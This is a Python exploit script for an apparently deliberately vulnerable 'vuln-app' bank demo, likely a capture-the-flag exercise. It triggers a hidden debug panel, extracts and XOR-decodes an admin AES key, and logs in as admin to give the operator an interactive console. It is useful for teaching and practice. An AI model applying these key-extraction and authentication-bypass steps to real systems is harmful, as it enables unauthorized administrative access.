""""
exploit.py
---------------
Simple exploit helper for the "vuln-app" demo used in this repository.

This script performs the following high-level actions:
- Spawns the target application provided in the command line argument.
- Navigates menus to trigger the hidden debug panel.
- Extracts the obfuscated admin AES key from the debug output and post-processes it.
    (XOR with repeating 0xDEADBEEF) to recover the real AES256 key
- Sets the recovered key in the `ADMIN_AES_KEY` environment variable and restarts
  the application so the admin console becomes available.
- Logs in to the admin account and provides a simple interactive view of the
  admin console so the operator can run admin commands.

Usage:
    python3 exploit.py <path_to_executable>

    Example:
        python3 exploit.py ./vuln-app
"""
import os
import sys
import time
import threading
import subprocess
import pty


class ProcessInteractor:
    """Small helper that runs a child process attached to a pseudo-TTY and
    provides simple send / expect helpers.

    The pty ensures the child behaves like a normal terminal-based interactive
    program (line buffering, prompts, etc.). `buf` contains accumulated
    stdout/stderr text read from the child; `send()` writes to the child's
    stdin. `expect()` is a convenience polling function that waits for a
    substring to appear in `buf`.
    """

    def __init__(self, argv, cwd=None):
        # Using pty to get better terminal interaction
        master, slave = pty.openpty()
        self.proc = subprocess.Popen(argv, stdin=slave, stdout=slave, stderr=slave, cwd=cwd, preexec_fn=os.setsid)
        os.close(slave)
        self.master = master
        self.lock = threading.Lock()
        # buffer for text read from the child
        self.buf = ""
        self.lines = []
        self.alive = True
        # background reader thread that appends child output into `buf`
        self.thread = threading.Thread(target=self._reader, daemon=True)
        self.thread.start()

    def _reader(self):
        try:
            while self.alive and self.proc.poll() is None:
                try:
                    data = os.read(self.master, 4096)
                    if data:
                        text = data.decode('utf-8', errors='replace')
                        with self.lock:
                            self.buf += text
                            self.lines.append(text)
                    else:
                        break
                except OSError:
                    break
        finally:
            self.alive = False

    def send(self, s):
        if self.proc.poll() is not None:
            raise RuntimeError("Process exited")
        try:
            os.write(self.master, s.encode('utf-8'))
        except Exception:
            pass

    def expect(self, substring, timeout=5.0):
        """Wait until `substring` appears in the process output buffer or timeout.

        This is a simple polling implementation intended for quick scripting and
        interaction with prompt-driven programs. It is not intended as a
        replacement for a full-featured expect library but is sufficient for the
        short-lived interactions used by this exploit helper.
        """
        end = time.time() + timeout
        while time.time() < end:
            with self.lock:
                if substring in self.buf:
                    return True
            time.sleep(0.05)
        return False

    def get_until(self, substring, timeout=5.0):
        """Return current buffer when `substring` appears, or None on timeout.

        Unlike `expect`, this returns the full `buf` captured so far which can
        be useful for extracting data (for example the debug output that
        contains the obfuscated key).
        """
        end = time.time() + timeout
        while time.time() < end:
            with self.lock:
                idx = self.buf.find(substring)
                if idx != -1:
                    return self.buf
            time.sleep(0.05)
        return None

    def close(self):
        try:
            os.close(self.master)
        except Exception:
            pass
        try:
            if self.proc.poll() is None:
                self.proc.terminate()
                try:
                    self.proc.wait(timeout=1)
                except Exception:
                    self.proc.kill()
        except Exception:
            pass


def main():
    """Main exploit routine.

    Steps:
    1. Launch target app and navigate to the Change Password flow.
    2. Send empty usernames repeatedly to trigger the hidden debug panel.
    3. Use the debug commands sequence to reveal the obfuscated key.
    4. XOR the extracted bytes, set `ADMIN_AES_KEY` in the environment and
       restart the application so the admin console becomes available.
    5. Authenticate to the admin login and present an interactive admin console
       view to the operator.
    """

    # --- STRICT ARGUMENT CHECK ---
    if len(sys.argv) < 2:
        print("[-] Error: Missing executable path.")
        print("[-] Usage: python3 exploit.py <path_to_executable>")
        return 1

    exe = sys.argv[1]

    if not os.path.exists(exe):
        print(f"[-] Error: Could not find executable at: {exe}")
        return 1
    # -----------------------------

    print(f"[+] Using executable: {exe}")

    p = ProcessInteractor([exe], cwd=os.getcwd())

    try:
        # wait for main menu to appear
        time.sleep(0.5)  # Give process time to startup
        if not p.expect("Welcome to Bank", timeout=5):
            print("[-] Did not see welcome banner; process output follows:")
            time.sleep(0.2)
            print(p.buf)
            return 1

        # choose Change Password (option 3)
        p.send("3\n")

        # We need to send empty usernames repeatedly until the hidden debug panel appears.
        # The program picks a random threshold between 15 and 30, so try a generous number of times.
        print("[+] Entering Change Password portal and submitting empty usernames to trigger debug panel...")
        triggered = False
        for attempt in range(1, 81):
            # send an empty username (just newline)
            p.send("\n")
            # small delay to let program process
            time.sleep(0.05)
            # check if debug prompt appears
            if p.expect("#>", timeout=0.2):
                print(f"[+] Debug panel triggered after {attempt} empty entries")
                triggered = True
                break

        if not triggered:
            print("[-] Failed to trigger debug panel after multiple attempts. Try running locally and increasing attempts.")
            return 1

        # we're in debug panel; interact with the staged commands
        # 1) help
        p.send("help\n")
        if not p.expect("Available commands", timeout=2):
            print("[-] Unexpected debug panel response. Buffer:\n", p.buf)
            return 1

        # 2) status --dump
        p.send("status --dump\n")
        if not p.expect("[HINT]", timeout=2):
            print("[-] Did not receive hint. Buffer:\n", p.buf)
            return 1

        # 3) open sesame (must be within 3 seconds)
        p.send("open sesame\n")
        if not p.expect("Enter Magic Token", timeout=3):
            print("[-] open sesame failed or timed out. Buffer:\n", p.buf)
            return 1

        # 4) send token
        p.send("!dev_override!\n")
        # wait for the config output to include deadbeef=
        if not p.expect("deadbeef=", timeout=3):
            print("[-] Token did not reveal key. Buffer:\n", p.buf)
            return 1

        # extract the decoded hex printed after deadbeef=
        out = p.get_until("deadbeef=", timeout=1)
        if not out:
            print("[-] Failed to capture output buffer")
            return 1

        # locate deadbeef= and capture until newline
        idx = out.find("deadbeef=")
        decoded = None
        if idx != -1:
            rest = out[idx + len("deadbeef="):]
            # read up to newline or whitespace
            decoded = rest.split()[0].strip()

        if decoded:
            print(f"[+] Decoded admin AES key: {decoded}")
            # The real key is the extracted key XORed with repeating 0xDEADBEEF
            try:
                # convert hex to bytes
                b = bytes.fromhex(decoded)
                xor_key = [0xDE, 0xAD, 0xBE, 0xEF]
                real = bytearray(len(b))
                for i in range(len(b)):
                    real[i] = b[i] ^ xor_key[i % 4]
                real_hex = real.hex()
                print(f"[+] Admin AES key (post-XOR): {real_hex}")
                
                # Set the key as environment variable
                os.environ["ADMIN_AES_KEY"] = real_hex
                print(f"[+] Set ADMIN_AES_KEY environment variable")
                
            except Exception as e:
                print("[-] Failed to post-process extracted key:", e)
                return 1
            
            # Close the current process and start a new one with the key set
            p.close()
            
            # Now log into the admin account
            print("[+] Connecting to admin console...")
            p = ProcessInteractor([exe], cwd=os.getcwd())
            
            try:
                # wait for main menu to appear
                time.sleep(0.5)
                if not p.expect("Welcome to Bank", timeout=5):
                    print("[-] Did not see welcome banner")
                    return 1
                
                # choose Admin Login (option 2)
                p.send("2\n")
                time.sleep(0.3)
                
                if not p.expect("Username", timeout=2):
                    print("[-] Did not see login prompt")
                    return 1
                
                # send admin username
                p.send("admin\n")
                
                if not p.expect("Password", timeout=2):
                    print("[-] Did not see password prompt")
                    return 1
                
                # send admin password
                p.send("password\n")
                
                # wait for successful login
                time.sleep(0.5)
                if p.expect("Welcome back, Admin", timeout=2):
                    print("[+] Successfully logged into admin account!")
                    print("[+] Admin console is now available\n")
                    
                    # Display the admin console and allow interactive use
                    print("=" * 60)
                    print(p.buf)
                    print("=" * 60)
                    
                    # Keep the console interactive
                    try:
                        while True:
                            user_input = input("> ")
                            if user_input.lower() in ['exit', 'quit', '5']:
                                p.send(user_input + "\n")
                                time.sleep(0.2)
                                break
                            p.send(user_input + "\n")
                            time.sleep(0.3)
                            print(p.buf)
                    except (EOFError, KeyboardInterrupt):
                        pass
                    
                    return 0
                else:
                    print("[-] Login may have failed. Buffer:\n", p.buf)
                    return 1
                    
            finally:
                p.close()
        else:
            print("[-] Could not parse decoded key from output:\n", out)
            return 1

    finally:
        p.close()


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("Interrupted")
        sys.exit(1)
